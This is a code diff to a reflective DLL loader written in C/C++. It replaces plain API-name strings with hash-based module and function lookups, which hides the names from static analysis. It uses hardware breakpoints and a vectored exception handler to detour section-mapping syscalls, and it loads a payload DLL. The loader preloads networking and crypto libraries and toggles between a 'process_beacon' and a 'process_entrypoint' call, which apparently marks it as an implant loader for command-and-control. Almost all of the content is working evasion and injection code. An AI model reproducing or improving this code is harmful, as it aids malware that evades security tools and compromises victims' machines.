@@ -1,5 +1,6 @@
 ﻿#include "pch.h"
 #include "framework.h"
+#include "api_hash.h"
 #include "rfdll.h"
 #include "types.h"
 #include "headers.h"
@@ -95,52 +96,40 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	fnLoadLibraryExA func_LoadLibraryExA = NULL;//to load sac dll without resolving imports
 
 	//stack strings for PIC
-	WCHAR str_Kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
-	WCHAR str_ntdll[] = { L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', L'\0' };
-	WCHAR str_user32[] = { L'U', L's', L'e', L'r', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
-	CHAR str_RtlAddFunctionTable[] = { 'R', 't', 'l', 'A', 'd', 'd', 'F', 'u', 'n', 'c', 't', 'i', 'o', 'n', 'T', 'a', 'b', 'l', 'e', '\0' };
-	CHAR str_LoadLibraryA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'A', '\0' };
-	CHAR str_LoadLibraryExA[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'E', 'x', 'A','\0' };
-	CHAR str_GetProcessId[] = { 'G', 'e', 't', 'P', 'r', 'o', 'c', 'e', 's', 's', 'I', 'd', '\0' };
 
 
 	//stack strings and variables for HBP
-	CHAR str_AddVectoredExceptionHandler[] = { 'A', 'd', 'd', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
-	CHAR str_RemoveVectoredExceptionHandler[] = { 'R', 'e', 'm', 'o', 'v', 'e', 'V', 'e', 'c', 't', 'o', 'r', 'e', 'd', 'E', 'x', 'c', 'e', 'p', 't', 'i', 'o', 'n', 'H', 'a', 'n', 'd', 'l', 'e', 'r', '\0' };
 	PVOID addr_ZwClose = NULL;
 	PVOID addr_NtMapViewOfSection = NULL;
 	PVOID addr_NtCreateSection = NULL;
-	CHAR str_ZwClose[] = { 'Z','w','C','l','o','s','e','\0' };
-	CHAR str_NtMapViewOfSection[] = { 'N', 't', 'M', 'a', 'p', 'V', 'i', 'e', 'w', 'O', 'f', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
-	CHAR str_NtCreateSection[] = { 'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'S', 'e', 'c', 't', 'i', 'o', 'n', '\0' };
 
 
 	//NT status variable for syscall return code
 	NTSTATUS status = 0x00;
 
-	HMODULE hm_kernel32 = GMHR(str_Kernel32);
-	HMODULE hm_ntdll = GMHR(str_ntdll);
+	HMODULE hm_kernel32 = GMHR_Hash(HASH_KERNEL32DLL);
+	HMODULE hm_ntdll = GMHR_Hash(HASH_NTDLLDLL);
 
-	fnAddVectoredExceptionHanlder func_AddVectoredExceptionHandler = (fnAddVectoredExceptionHanlder)GPAR(hm_kernel32, str_AddVectoredExceptionHandler);
-	fnRemoveVectoredExceptionHandler func_RemoveVectoredExceptionHandler = (fnRemoveVectoredExceptionHandler)GPAR(hm_kernel32, str_RemoveVectoredExceptionHandler);
+	fnAddVectoredExceptionHanlder func_AddVectoredExceptionHandler = (fnAddVectoredExceptionHanlder)GPAR_Hash(hm_kernel32, HASH_ADDVECTOREDEXCEPTIONHANDLER);
+	fnRemoveVectoredExceptionHandler func_RemoveVectoredExceptionHandler = (fnRemoveVectoredExceptionHandler)GPAR_Hash(hm_kernel32, HASH_REMOVEVECTOREDEXCEPTIONHANDLER);
 
-	if ((func_LoadLibraryExA = (fnLoadLibraryExA)GPAR(hm_kernel32, str_LoadLibraryExA)) == NULL)
+	if ((func_LoadLibraryExA = (fnLoadLibraryExA)GPAR_Hash(hm_kernel32, HASH_LOADLIBRARYEXA)) == NULL)
 		return FALSE;
-	if ((func_LoadLibraryA = (fnLoadLibraryA)GPAR(hm_kernel32, str_LoadLibraryA)) == NULL)
+	if ((func_LoadLibraryA = (fnLoadLibraryA)GPAR_Hash(hm_kernel32, HASH_LOADLIBRARYA)) == NULL)
 		return FALSE;
-	if (!(func_RtlAddFunctionTable = (fnRtlAddFunctionTable)GPAR(hm_kernel32, str_RtlAddFunctionTable)))
+	if (!(func_RtlAddFunctionTable = (fnRtlAddFunctionTable)GPAR_Hash(hm_kernel32, HASH_RTLADDFUNCTIONTABLE)))
 		return FALSE;
 
 	SYSCALL_ENTRY zw_func_s[AmountofSyscalls] = { 0 };
-	retrieve_zw_func_s(GMHR(str_ntdll), zw_func_s);
+	retrieve_zw_func_s(GMHR_Hash(HASH_NTDLLDLL), zw_func_s);
 
 
 	/* set hardware breakpoint and detour functions */
 	func_AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)&VectorHandler);
 
-	addr_ZwClose = GPAR(hm_ntdll, str_ZwClose);
-	addr_NtMapViewOfSection = GPAR(hm_ntdll, str_NtMapViewOfSection);
-	addr_NtCreateSection = GPAR(hm_ntdll, str_NtCreateSection);
+	addr_ZwClose = GPAR_Hash(hm_ntdll, HASH_ZWCLOSE);
+	addr_NtMapViewOfSection = GPAR_Hash(hm_ntdll, HASH_NTMAPVIEWOFSECTION);
+	addr_NtCreateSection = GPAR_Hash(hm_ntdll, HASH_NTCREATESECTION);
 
 	if (addr_ZwClose != NULL
 		&& addr_NtCreateSection != NULL
@@ -227,7 +216,7 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 	sac_dll_payload_size = (SIZE_T)sac_dll_img_nt_hdr_ptr->OptionalHeader.SizeOfImage;
 
 
-	HANDLE sac_dll_handle = find_SRH_DLL_section_handle(zw_func_s, (fnGetProcessId)GPAR(hm_kernel32, str_GetProcessId));
+	HANDLE sac_dll_handle = find_SRH_DLL_section_handle(zw_func_s, (fnGetProcessId)GPAR_Hash(hm_kernel32, HASH_GETPROCESSID));
 	if (sac_dll_handle == FALSE || sac_dll_handle == (HANDLE)(-1))
 		return 0;
 
@@ -551,11 +540,8 @@ EXTERN_DLL_EXPORT PBYTE ReflectiveFunction()
 
 EXTERN_DLL_EXPORT bool yolo()
 {
-	WCHAR kernel32[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', L'\0' };
-	CHAR str_create_thread[] = { 'C','r','e','a','t','e','T','h','r','e','a','d','\0' };
-
 	fnCreateThread func_CreateThread = NULL;
-	if ((func_CreateThread = (fnCreateThread)GPAR(GMHR(kernel32), str_create_thread)) == NULL)
+	if ((func_CreateThread = (fnCreateThread)GPAR_Hash(GMHR_Hash(HASH_KERNEL32DLL), HASH_CREATETHREAD)) == NULL)
 		return FALSE;
 
 	fnDllMain dll_main = NULL;
@@ -703,9 +689,13 @@ static DWORD WINAPI process_entrypoint_thread(LPVOID lpParameter)
 	if (ST_FAILED(status))
 		return status;
 
+	GMHR_Hash(HASH_WS232DLL);
+	GMHR_Hash(HASH_WINHTTPDLL);
+	GMHR_Hash(HASH_BCRYPTDLL);
 
-    ////status_t st = process_entrypoint(hModule);
-    status = process_beacon(hModule);
+
+    status = process_entrypoint(hModule);
+    //status = process_beacon(hModule);
     return (DWORD)status; // 确保 status_t 可转换为 DWORD
 }
 
